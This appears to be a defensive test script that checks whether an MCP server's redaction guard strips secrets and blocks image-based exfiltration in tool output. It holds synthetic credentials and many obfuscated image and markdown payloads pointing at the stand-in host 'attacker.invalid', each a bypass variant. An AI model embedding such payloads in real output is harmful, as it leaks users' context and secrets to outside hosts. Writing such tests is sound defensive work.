// T24 recheck 2 — the same rows at the REAL public boundary: dispatchCallTool
// (MCP transport), prepareOutputForPersistence (durable-sink materializer) and
// redactToolOutput (the MCP compatibility seam). Read-only, synthetic only.
import { prepareOutputForPersistence, type GuardResult } from "../../../../src/security/guard";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import { redactToolOutput } from "../../../../src/mcp/redact-seam";

const S = ["AKIA", "IOSFODNN7EXAMPLE"].join("");
const ESCAPED = "AKIA\\u0049OSFODNN7EXAMPLE";
const CRED = "tr0ub4dor-correct-horse";
const ATT = "attacker.invalid";
const CONSTANT = "Output withheld: format-unsafe";
const BS = String.fromCharCode(92); // backslash, written as a code unit
const TAB = String.fromCharCode(9);

const pass: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};

// ── persistence materializer ────────────────────────────────────────────────
const persistenceShapes: Record<string, string> = {
  plainDuplicate: `{"a":"${S}","a":"safe"}`,
  escapedDuplicate: `{"a":"${ESCAPED}","a":"safe"}`,
  credEmptySurvivor: `{"pwd":"${CRED}","pwd":""}`,
  credNullSurvivor: `{"api_key":"${CRED}","api_key":null}`,
  credBooleanSurvivor: `{"secret":"${CRED}","secret":false}`,
  duplicateNested: `{"outer":{"k":"${S}","k":"safe"}}`,
  duplicateInArray: `[{"k":"${CRED}","k":"safe"}]`,
  duplicateThreeWay: `{"k":"${S}","k":"${CRED}","k":"safe"}`,
  secretPropertyName: `{"${S}":"x"}`,
  numericUnderCredentialKey: `{"password":123456789}`,
  urlThenEmail: JSON.stringify({ docs: "https://example.com", note: "ping@host.example" }),
  requiredAllowedAndRedacted: JSON.stringify({ metric: S, count: 123456789 }),
  cleanPretty: JSON.stringify({ id: "safe-id", count: 12, ok: true }, null, 2),
  cleanCompact: `{"id":"safe-id","count":12}`,
  backslashImage: JSON.stringify({ note: `<img src="${BS}${BS}${ATT}/p?x=ctx">` }),
  namedTabImage: JSON.stringify({ note: `<img src="ht&Tab;tps://${ATT}/p?x=ctx">` }),
  imageTag: JSON.stringify({ note: `<image src="https://${ATT}/p?x=ctx">` }),
};

const persistence = Object.fromEntries(
  Object.entries(persistenceShapes).map(([name, input]) => {
    const r = prepareOutputForPersistence(pass, input);
    return [
      name,
      r.allowed
        ? {
            allowed: true,
            leaksSecret: r.content.includes(S),
            leaksEscapedBytes: r.content.includes(ESCAPED),
            leaksCred: r.content.includes(CRED),
            leaksHost: r.content.includes(ATT),
            bytesIdenticalToInput: r.content === input,
            content: r.content,
          }
        : { allowed: false, reason: r.reason },
    ];
  }),
);

// ── MCP compatibility seam ──────────────────────────────────────────────────
const seam = Object.fromEntries(
  await Promise.all(
    Object.entries(persistenceShapes).map(async ([name, input]) => {
      const text = await redactToolOutput(process.cwd(), input);
      return [
        name,
        {
          identicalToInput: text === input,
          leaksSecret: text.includes(S),
          leaksEscapedBytes: text.includes(ESCAPED),
          leaksCred: text.includes(CRED),
          leaksHost: text.includes(ATT),
          text,
        },
      ];
    }),
  ),
);

// ── real MCP transport ──────────────────────────────────────────────────────
const tool = (
  name: string,
  invoke: () => Promise<unknown>,
  outputSchema?: Record<string, unknown>,
) => ({
  name,
  module: "standard" as const,
  description: name,
  inputSchema: { type: "object" },
  ...(outputSchema === undefined ? {} : { outputSchema }),
  mutating: false,
  invoke,
});

const ctx: McpContext = {
  cwd: process.cwd(),
  config: mergeMcpConfig({ redactToolOutput: false }), // advisory OFF: the floor must still apply
  discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
  transport: "in-process",
  tools: [
    // row 1
    tool("p.secret-key", async () => ({ [S]: "safe" })),
    tool("p.deep-secret-key", async () => ({ rows: [{ meta: { [S]: 1 } }] })),
    tool("p.email-key", async () => ({ "ping@host.example": 1 })),
    tool("p.numeric-key", async () => ({ "1234567890": "ok", user_id_42: "ok" })),
    tool("p.password-key", async () => ({ password: "hunter" })),
    tool("p.password-numeric", async () => ({ password: 123456789 })),
    // row 3
    tool("p.ref-sibling", async () => "short", {
      $defs: { base: { type: "string" } },
      $ref: "#/$defs/base",
      minLength: 20,
    }),
    tool("p.ref-defs-sibling", async () => "ok", {
      $ref: "#/$defs/base",
      $defs: { base: { type: "string" } },
    }),
    tool("p.ref-annotations", async () => "ok", {
      $ref: "#/$defs/base",
      $defs: { base: { type: "string" } },
      title: "T",
    }),
    tool("p.ref-unresolvable", async () => "ok", {
      $ref: "#/$defs/nope",
      $defs: { base: { type: "string" } },
    }),
    // row 4 — previously fixed
    tool("p.entity-image", async () => ({ note: `<img src="https&#58;//${ATT}/p?x=ctx">` })),
    tool("p.padded-entity-image", async () => ({ note: `<img src="https&#00000058;//${ATT}/p?x=ctx">` })),
    tool("p.leading-space-image", async () => ({ note: `<img src=" https://${ATT}/p?x=ctx">` })),
    tool("p.srcset-image", async () => ({ note: `<img srcset="/l.png 1x, https://${ATT}/p?x=ctx 2x">` })),
    tool("p.literal-tab-image", async () => ({ note: `<img src="ht${TAB}tps://${ATT}/p?x=ctx">` })),
    // row 4 — NEW vectors this recheck found
    tool("p.backslash-protocol-relative", async () => ({ note: `<img src="${BS}${BS}${ATT}/p?x=ctx">` })),
    tool("p.backslash-scheme", async () => ({ note: `<img src="https:${BS}${BS}${ATT}/p?x=ctx">` })),
    tool("p.triple-slash", async () => ({ note: `<img src="https:///${ATT}/p?x=ctx">` })),
    tool("p.named-tab-image", async () => ({ note: `<img src="ht&Tab;tps://${ATT}/p?x=ctx">` })),
    tool("p.named-newline-image", async () => ({ note: `<img src="ht&NewLine;tps://${ATT}/p?x=ctx">` })),
    tool("p.image-tag", async () => ({ note: `<image src="https://${ATT}/p?x=ctx">` })),
    tool("p.srcset-backslash", async () => ({ note: `<img srcset="${BS}${BS}${ATT}/p?x=ctx 1x">` })),
    tool("p.markdown-angle-tab", async () => ({ note: `![x](<ht${TAB}tps://${ATT}/p?x=ctx>)` })),
    // controls
    tool("p.public-link", async () => ({ note: "[public documentation](https://docs.example.org/guide)" })),
    tool("p.public-link-plus-email", async () => ({
      note: "[public documentation](https://docs.example.org/guide)",
      contact: "ping@host.example",
    })),
    tool("p.safe-scalars", async () => ({ id: "safe-id", count: 12, ok: true, nothing: null, ratio: 1.25 })),
    tool("p.throws-secret", async () => {
      throw new Error(`upstream rejected key ${S}`);
    }),
  ],
};

const call = async (name: string) => {
  const r = await dispatchCallTool(ctx, name, {});
  const whole = JSON.stringify(r);
  return {
    isError: r.isError,
    redaction: r.redaction,
    constantText: r.text === CONSTANT,
    leaksSecret: whole.includes(S),
    leaksHost: whole.includes(ATT),
    text: r.text,
  };
};

const names = [
  "p.secret-key", "p.deep-secret-key", "p.email-key", "p.numeric-key",
  "p.password-key", "p.password-numeric",
  "p.ref-sibling", "p.ref-defs-sibling", "p.ref-annotations", "p.ref-unresolvable",
  "p.entity-image", "p.padded-entity-image", "p.leading-space-image", "p.srcset-image",
  "p.literal-tab-image",
  "p.backslash-protocol-relative", "p.backslash-scheme", "p.triple-slash",
  "p.named-tab-image", "p.named-newline-image", "p.image-tag", "p.srcset-backslash",
  "p.markdown-angle-tab",
  "p.public-link", "p.public-link-plus-email", "p.safe-scalars", "p.throws-secret",
  "p.does-not-exist",
];

const mcp: Record<string, unknown> = {};
for (const name of names) mcp[name] = await call(name);

const { writeFileSync } = await import("node:fs");
const out = process.argv[2] ?? "/tmp/T24-recheck2-boundary.json";
writeFileSync(out, JSON.stringify({ persistence, seam, mcp }, null, 2));

console.log("== PERSISTENCE ==");
for (const [k, v] of Object.entries(persistence)) {
  const x = v as never as Record<string, unknown>;
  console.log(
    `${k}\tallowed=${x.allowed}\tleakS=${x.leaksSecret ?? "-"}\tleakEsc=${x.leaksEscapedBytes ?? "-"}\tleakCred=${x.leaksCred ?? "-"}\tleakHost=${x.leaksHost ?? "-"}\tbytesIdentical=${x.bytesIdenticalToInput ?? "-"}`,
  );
}
console.log("== SEAM ==");
for (const [k, v] of Object.entries(seam)) {
  const x = v as never as Record<string, unknown>;
  console.log(
    `${k}\tidentical=${x.identicalToInput}\tleakS=${x.leaksSecret}\tleakEsc=${x.leaksEscapedBytes}\tleakCred=${x.leaksCred}\tleakHost=${x.leaksHost}`,
  );
}
console.log("== MCP TRANSPORT ==");
for (const name of names) {
  const x = mcp[name] as never as Record<string, unknown>;
  const red = x.redaction as { state?: string; reasons?: string[] } | undefined;
  console.log(
    `${name}\tisError=${x.isError}\tstate=${red?.state}\treasons=${(red?.reasons ?? []).join("|")}\tconstText=${x.constantText}\tleakS=${x.leaksSecret}\tleakHost=${x.leaksHost}`,
  );
}
console.log(`wrote ${out}`);
